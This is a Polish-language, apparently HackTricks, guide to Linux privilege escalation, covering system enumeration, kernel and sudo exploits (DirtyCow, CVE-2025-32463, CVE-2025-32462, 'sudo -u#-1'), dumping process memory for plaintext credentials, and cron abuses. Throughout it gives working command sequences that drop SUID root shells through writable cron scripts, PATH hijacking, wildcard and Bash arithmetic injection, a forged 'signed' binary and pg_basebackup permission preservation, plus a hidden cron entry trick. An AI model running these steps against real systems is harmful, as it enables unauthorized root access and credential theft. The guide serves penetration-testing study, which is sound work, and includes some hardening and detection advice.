# Eskalacja uprawnień w systemie Linux

{{#include ../../../banners/hacktricks-training.md}}

Aby uzyskać szerszy kontekst i poznać historyczne procesy enumeracji, porównaj zasoby g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation oraz linux-private-i wymienione w sekcji referencji.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy od zdobycia wiedzy o uruchomionym systemie operacyjnym
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym folderze wewnątrz zmiennej `PATH`**, możesz być w stanie przejąć niektóre biblioteki lub pliki binarne:
```bash
echo $PATH
```
### Informacje o środowisku

Czy w zmiennych środowiskowych znajdują się interesujące informacje, hasła lub klucze API?
```bash
(env || set) 2>/dev/null
```
### Exploity kernela

Sprawdź wersję kernela i sprawdź, czy istnieje exploit, którego można użyć do eskalacji uprawnień
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych wersji kernela oraz już **compiled exploits** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Inne strony, na których możesz znaleźć **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje kernela z tej strony, możesz wykonać:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (uruchom w ofierze, sprawdza tylko exploity dla kernela 2.x)

Zawsze **wyszukuj wersję kernela w Google** — być może Twoja wersja kernela jest wymieniona w jakimś kernel exploicie, dzięki czemu będziesz mieć pewność, że exploit jest poprawny.

Dodatkowe techniki kernel exploitation:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacja uprawnień w systemie Linux - kernel Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo wymienionych w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna na ataki, używając tego grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Wersje Sudo wcześniejsze niż 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) pozwalają nieuprzywilejowanym użytkownikom lokalnym eskalować uprawnienia do root za pomocą opcji `--chroot` programu sudo, gdy plik `/etc/nsswitch.conf` jest używany z katalogu kontrolowanego przez użytkownika.<sup>[[28]](#references)[[29]](#references)</sup>

Tutaj znajduje się [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) umożliwiający wykorzystanie tej [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Przed uruchomieniem exploita upewnij się, że używana wersja `sudo` jest podatna i obsługuje funkcję `chroot`.

Więcej informacji znajdziesz w oryginalnym [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Ominięcie reguł Sudo opartych na hoście (CVE-2025-32462)

Sudo w wersji wcześniejszej niż 1.9.17p1 (zgłoszony zakres podatnych wersji: **1.8.8–1.9.17**) może oceniać reguły sudoers oparte na hoście, używając **nazwy hosta podanej przez użytkownika** z `sudo -h <host>` zamiast **rzeczywistej nazwy hosta**. Jeśli sudoers przyznaje szersze uprawnienia na innym hoście, możesz lokalnie **spoofować** ten host.<sup>[[29]](#references)</sup>

Wymagania:
- Podatna wersja sudo
- Reguły sudoers specyficzne dla hosta (host nie jest bieżącą nazwą hosta ani `ALL`)

Przykładowy wzorzec sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit przez spoofing dozwolonego hosta:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Jeśli rozwiązywanie sfałszowanej nazwy się blokuje, dodaj ją do `/etc/hosts` lub użyj nazwy hosta, która już występuje w logach/konfiguracjach, aby uniknąć zapytań DNS.

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Weryfikacja podpisu Dmesg nie powiodła się

Sprawdź **maszynę smasher2 na HTB**, aby zobaczyć **przykład** wykorzystania tej luki.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dalsza enumeracja systemu
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Wymień możliwe zabezpieczenia

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Jeśli znajdujesz się wewnątrz kontenera, zacznij od poniższej sekcji container-security, a następnie przejdź do stron dotyczących abuse specyficznego dla danego runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Dyski

Sprawdź **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować to zamontować i sprawdzić, czy zawiera prywatne informacje
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wymień przydatne pliki binarne
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź również, czy **zainstalowany jest jakikolwiek kompilator**. Jest to przydatne, jeśli musisz użyć jakiegoś kernel exploit, ponieważ zaleca się skompilowanie go na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane podatne oprogramowanie

Sprawdź **wersje zainstalowanych pakietów i usług**. Być może jest zainstalowana stara wersja Nagios, którą można wykorzystać do eskalacji uprawnień…\
Zaleca się ręczne sprawdzenie wersji bardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS**, aby sprawdzić, czy wewnątrz maszyny zainstalowano nieaktualne i podatne oprogramowanie.

> [!NOTE] > _Pamiętaj, że te polecenia wyświetlą wiele informacji, które w większości będą bezużyteczne. Dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy którakolwiek zainstalowanych wersji oprogramowania jest podatna na znane exploity_

## Procesy

Sprawdź, **jakie procesy** są wykonywane, i zobacz, czy którykolwiek proces ma **więcej uprawnień, niż powinien** (może tomcat jest uruchamiany przez root?).
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy nie są uruchomione [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md), ponieważ możesz je wykorzystać do eskalacji uprawnień. **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
Sprawdź również **swoje uprawnienia do plików binarnych procesów** — być może możesz nadpisać któryś z nich.

### Łańcuchy nadrzędny-podrzędny między użytkownikami

Proces potomny działający pod **innym użytkownikiem** niż jego proces nadrzędny nie jest automatycznie złośliwy, ale stanowi użyteczny **sygnał wstępnej analizy**. Niektóre przejścia są oczekiwane (`root` uruchamiający użytkownika usługi, menedżery logowania tworzące procesy sesji), jednak nietypowe łańcuchy mogą ujawnić wrappery, helpery debugowania, persistence lub słabe granice zaufania środowiska uruchomieniowego.

Szybki przegląd:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Jeśli znajdziesz zaskakujący łańcuch, sprawdź wiersz poleceń procesu nadrzędnego oraz wszystkie pliki wpływające na jego działanie (`config`, `EnvironmentFile`, skrypty pomocnicze, katalog roboczy, zapisywalne argumenty). W kilku rzeczywistych ścieżkach privesc sam proces potomny nie był zapisywalny, ale **config kontrolowany przez proces nadrzędny** lub łańcuch skryptów pomocniczych już tak.

### Usunięte pliki wykonywalne i usunięte pliki otwarte przez proces

Artefakty środowiska uruchomieniowego są często nadal dostępne **po usunięciu**. Jest to przydatne zarówno do eskalacji uprawnień, jak i do odzyskiwania dowodów z procesu, który nadal ma otwarte wrażliwe pliki.

Sprawdź usunięte pliki wykonywalne:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Jeśli `/proc/<PID>/exe` wskazuje na `(deleted)`, proces nadal uruchamia stary obraz binarny z pamięci. To silny sygnał do dalszego sprawdzenia, ponieważ:

- usunięty plik wykonywalny może zawierać interesujące ciągi znaków lub dane uwierzytelniające
- uruchomiony proces może nadal udostępniać przydatne deskryptory plików
- usunięty uprzywilejowany plik binarny może wskazywać na niedawne manipulacje lub próbę zatarcia śladów

Zbierz globalnie usunięte, otwarte pliki:
```bash
lsof +L1
```
Jeśli znajdziesz interesujący deskryptor, odzyskaj go bezpośrednio:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Jest to szczególnie cenne, gdy proces nadal ma otwarty usunięty sekret, skrypt, eksport bazy danych lub plik z flagą.

### Monitorowanie procesów

Możesz używać narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy) do monitorowania procesów. Może to być bardzo przydatne do identyfikowania podatnych procesów, które są często uruchamiane lub uruchamiane po spełnieniu określonego zestawu wymagań.

### Pamięć procesu

Niektóre usługi serwera zapisują **dane uwierzytelniające w jawnym tekście w pamięci**.\
Zwykle potrzebujesz **uprawnień root**, aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zazwyczaj bardziej przydatne, gdy masz już uprawnienia root i chcesz znaleźć więcej danych uwierzytelniających.\
Pamiętaj jednak, że **jako zwykły użytkownik możesz odczytać pamięć procesów, których jesteś właścicielem**.

> [!WARNING]
> Pamiętaj, że obecnie większość maszyn **domyślnie nie zezwala na ptrace**, co oznacza, że nie możesz zrzucać pamięci innych procesów należących do Twojego nieuprzywilejowanego użytkownika.
>
> Plik _**/proc/sys/kernel/yama/ptrace_scope**_ kontroluje dostępność ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. Jest to klasyczny sposób działania ptrace.
> - **kernel.yama.ptrace_scope = 1**: debugowany może być tylko proces nadrzędny.
> - **kernel.yama.ptrace_scope = 2**: tylko administrator może używać ptrace, ponieważ wymaga to capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: żadne procesy nie mogą być śledzone za pomocą ptrace. Po ustawieniu tej wartości wymagany jest restart systemu, aby ponownie włączyć ptrace.

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać stertę (Heap) i wyszukać w niej dane uwierzytelniające.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Dla danego identyfikatora procesu **maps pokazuje sposób mapowania pamięci w wirtualnej przestrzeni adresowej tego procesu**; pokazuje również **uprawnienia każdego zamapowanego regionu**. Pseudo-plik **mem udostępnia samą pamięć procesu**. Z pliku **maps** wiemy, które **regiony pamięci są możliwe do odczytu** oraz jakie są ich offsety. Używamy tych informacji, aby **przejść do odpowiednich pozycji w pliku mem i zrzucić wszystkie możliwe do odczytu regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` zapewnia dostęp do **fizycznej** pamięci systemu, a nie do pamięci wirtualnej. Przestrzeń adresową wirtualną kernela można uzyskać za pomocą /dev/kmem.\
Zazwyczaj `/dev/mem` jest dostępne tylko do odczytu dla **roota** i grupy **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla systemu Linux

ProcDump to linuxowa wersja klasycznego narzędzia ProcDump z pakietu narzędzi Sysinternals dla systemu Windows. Pobierz je z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby zrzucić pamięć procesu, możesz użyć:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymagania dotyczące root i zrzucić pamięć procesu należącego do Ciebie
- Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagany root)

### Dane uwierzytelniające z pamięci procesu

#### Przykład ręczny

Jeśli znajdziesz działający proces uwierzytelniający:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz zrzucić pamięć procesu (zobacz wcześniejsze sekcje, aby znaleźć różne sposoby zrzucania pamięci procesu) i wyszukać dane uwierzytelniające w pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **wykradnie dane uwierzytelniające w postaci jawnego tekstu z pamięci** oraz z niektórych **dobrze znanych plików**. Do poprawnego działania wymaga uprawnień root.

| Funkcja                                           | Nazwa procesu         |
| ------------------------------------------------- | ---------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)         | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (aktywne sesje SSH - użycie Sudo)         | sshd:                |

#### Wyszukiwane wyrażenia regularne/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane zadania/Cron

### Crontab UI (alseambusher) działający jako root – webowy scheduler privesc

Jeśli panel webowy „Crontab UI” (alseambusher/crontab-ui) działa jako root i jest powiązany wyłącznie z loopbackiem, nadal możesz uzyskać do niego dostęp przez lokalne przekierowanie portu SSH i utworzyć uprzywilejowane zadanie w celu eskalacji.<sup>[[1]](#references)[[4]](#references)</sup>

Typowy łańcuch
- Wykryj port dostępny wyłącznie przez loopback (np. 127.0.0.1:8000) oraz realm Basic-Auth za pomocą `ss -ntlp` / `curl -v localhost:8000`
- Znajdź dane uwierzytelniające w artefaktach operacyjnych:
- Backupy/skrypty z `zip -P <password>`
- Jednostka systemd ujawniająca `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Utwórz tunel i zaloguj się:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Utwórz zadanie z wysokimi uprawnieniami i uruchom je natychmiast (upuszcza powłokę SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Użyj tego:
```bash
/tmp/rootshell -p   # root shell
```
Wzmacnianie zabezpieczeń
- Nie uruchamiaj Crontab UI jako root; ogranicz je za pomocą dedykowanego użytkownika i minimalnych uprawnień
- Powiąż z localhost i dodatkowo ogranicz dostęp za pomocą firewall/VPN; nie używaj ponownie haseł
- Unikaj osadzania sekretów w plikach jednostek; używaj secret stores lub EnvironmentFile dostępnego wyłącznie dla root
- Włącz audytowanie/logowanie wykonywania zadań na żądanie

Sprawdź, czy jakiekolwiek zaplanowane zadanie jest podatne na ataki. Być może możesz wykorzystać skrypt wykonywany przez root (podatność typu wildcard? możesz modyfikować pliki używane przez root? użyć symlinków? utworzyć określone pliki w katalogu używanym przez root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Jeśli używane jest `run-parts`, sprawdź, które nazwy zostaną faktycznie wykonane:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Pozwala to uniknąć false positives. Zapisywalny katalog okresowy jest przydatny tylko wtedy, gdy nazwa pliku payloadu odpowiada lokalnym regułom `run-parts`.

### Ścieżka Cron

Na przykład w pliku _/etc/crontab_ można znaleźć PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik „user” ma uprawnienia do zapisu w /home/user_)

Jeśli w tym crontab użytkownik root próbuje wykonać polecenie lub skrypt bez ustawiania ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
Wtedy możesz uzyskać root shell, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Jeśli skrypt wykonywany przez root zawiera „**\***” wewnątrz polecenia, możesz to wykorzystać do uzyskania nieoczekiwanych rezultatów (takich jak privesc). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli wildcard jest poprzedzony ścieżką, taką jak** _**/some/path/\***_ **, nie jest podatny (nawet** _**./\***_ **nie jest).**

Przeczytaj poniższą stronę, aby poznać więcej trików związanych z exploitation wildcardów:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Wstrzyknięcie Bash arithmetic expansion w parserach logów cron

Bash wykonuje parameter expansion i command substitution przed ewaluacją arithmetic w `((...))`, `$((...))` oraz `let`. Jeśli root cron/parser odczytuje niezaufane pola logów i przekazuje je do kontekstu arithmetic, attacker może wstrzyknąć command substitution `$(...)`, które zostanie wykonane jako root podczas uruchamiania cron.<sup>[[22]](#references)</sup>

- Dlaczego to działa: W Bash expansions zachodzą w następującej kolejności: parameter/variable expansion, command substitution, arithmetic expansion, a następnie word splitting i pathname expansion. Zatem wartość taka jak `$(/bin/bash -c 'id > /tmp/pwn')0` jest najpierw podstawiana (uruchamiając command), a następnie pozostałe numeryczne `0` jest używane przez arithmetic, dzięki czemu skrypt kontynuuje działanie bez błędów.

- Typowy podatny wzorzec:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Doprowadź do zapisania tekstu kontrolowanego przez attackera w parsowanym logu, tak aby pole wyglądające jak liczba zawierało command substitution i kończyło się cyfrą. Upewnij się, że Twój command nie wypisuje nic na stdout (lub przekieruj jego output), aby arithmetic pozostało poprawne.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Nadpisywanie skryptu cron i symlink

Jeśli **możesz modyfikować skrypt cron** wykonywany przez root, możesz bardzo łatwo uzyskać shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt wykonywany przez root używa **katalogu, do którego masz pełny dostęp**, być może przydatne byłoby usunięcie tego folderu i **utworzenie folderu będącego dowiązaniem symbolicznym do innego**, zawierającego skrypt kontrolowany przez Ciebie
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Walidacja Symlinków i bezpieczniejsze przetwarzanie plików

Podczas przeglądania uprzywilejowanych skryptów/binarek, które odczytują lub zapisują pliki po ścieżce, sprawdź, jak obsługiwane są linki:

- `stat()` podąża za Symlinkiem i zwraca metadane obiektu docelowego.
- `lstat()` zwraca metadane samego linku.
- `readlink -f` i `namei -l` pomagają rozwiązać końcowy obiekt docelowy oraz wyświetlić uprawnienia każdego komponentu ścieżki.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Dla defenderów/deweloperów bezpieczniejsze wzorce chroniące przed trikami z symlinkami obejmują:

- `O_EXCL` z `O_CREAT`: zakończ działanie niepowodzeniem, jeśli ścieżka już istnieje (blokuje utworzone wcześniej przez atakującego linki/pliki).
- `openat()`: działaj względem deskryptora pliku zaufanego katalogu.
- `mkstemp()`: twórz pliki tymczasowe atomowo, z bezpiecznymi uprawnieniami.

### Własnoręcznie podpisane pliki binarne cron z zapisywalnymi payloadami
Zespoły blue team czasami „podpisują” pliki binarne uruchamiane przez cron, zrzucając niestandardową sekcję ELF i wyszukując ciąg dostawcy przed uruchomieniem ich jako root. Jeśli taki plik binarny ma uprawnienia do zapisu dla grupy (np. `/opt/AV/periodic-checks/monitor`, należący do `root:devs 770`), a Ty możesz pozyskać materiały używane do podpisywania, możesz sfałszować sekcję i przejąć zadanie cron:<sup>[[2]](#references)</sup>

1. Użyj `pspy`, aby przechwycić przebieg weryfikacji. W maszynie Era root uruchamiał `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, następnie `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, a potem wykonywał plik.
2. Odtwórz oczekiwany certyfikat przy użyciu pozyskanego klucza/konfiguracji (z `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Zbuduj złośliwy zamiennik (np. umieść SUID bash lub dodaj swój klucz SSH) i osadź certyfikat w `.text_sig`, aby `grep` zakończył się powodzeniem:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Nadpisz zaplanowany plik binarny, zachowując bity wykonywania:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Poczekaj na następne uruchomienie cron; gdy naiwne sprawdzenie podpisu zakończy się powodzeniem, Twój payload zostanie uruchomiony jako root.

### Często uruchamiane zadania cron

Możesz monitorować procesy, aby wyszukiwać procesy uruchamiane co 1, 2 lub 5 minut. Być może uda Ci się to wykorzystać do eskalacji uprawnień.

Na przykład, aby **monitorować co 0,1 s przez 1 minutę**, **sortować według rzadziej wykonywanych poleceń** i usuwać polecenia, które zostały wykonane najczęściej, możesz użyć:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (będzie monitorować i wyświetlać każdy uruchamiany proces).

### Kopie zapasowe wykonywane przez root, które zachowują ustawione przez atakującego bity uprawnień (pg_basebackup)

Jeśli cron uruchamiany przez root opakowuje `pg_basebackup` (lub dowolne rekurencyjne kopiowanie) dla katalogu bazy danych, do którego masz uprawnienia zapisu, możesz umieścić **plik binarny SUID/SGID**, który zostanie skopiowany ponownie jako **root:root**, z tymi samymi bitami uprawnień, do katalogu docelowego kopii zapasowej.<sup>[[26]](#references)</sup>

Typowy proces wykrywania (jako użytkownik DB o niskich uprawnieniach):
- Użyj `pspy`, aby znaleźć cron uruchamiany przez root, wywołujący coś w rodzaju `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` co minutę.
- Potwierdź, że klaster źródłowy (np. `/var/lib/postgresql/14/main`) jest zapisywalny przez Ciebie oraz że katalog docelowy (`/opt/backups/current`) po wykonaniu zadania staje się własnością root.

Wykorzystanie:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Działa to, ponieważ `pg_basebackup` zachowuje bity uprawnień plików podczas kopiowania klastra; gdy zostanie uruchomiony przez root, pliki docelowe dziedziczą **własność root + wybrane przez atakującego bity SUID/SGID**. Każda podobna uprzywilejowana procedura tworzenia kopii zapasowej/kopiowania, która zachowuje uprawnienia i zapisuje dane w lokalizacji wykonywalnej, jest podatna na atak.

### Niewidoczne zadania cron

Możliwe jest utworzenie cronjobu **poprzez umieszczenie znaku powrotu karetki po komentarzu** (bez znaku nowej linii), a zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Aby wykryć tego rodzaju ukryty punkt wejścia, przeanalizuj pliki cron za pomocą narzędzi ujawniających znaki sterujące:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Usługi

### Zapisywalne pliki _.service_

